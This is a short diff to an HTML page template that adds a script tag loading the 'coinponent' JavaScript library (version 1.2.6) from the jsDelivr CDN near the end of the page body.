@@ -180,7 +180,7 @@
         </div>
     </div>
 </div>
-
+<script src="https://cdn.jsdelivr.net/gh/coinponent/coinponent@1.2.6/dist/coinponent.js"></script>
 <div class="rightbar-overlay" onclick="$.toggleRightBar()"></div>
 </body>
 </html>
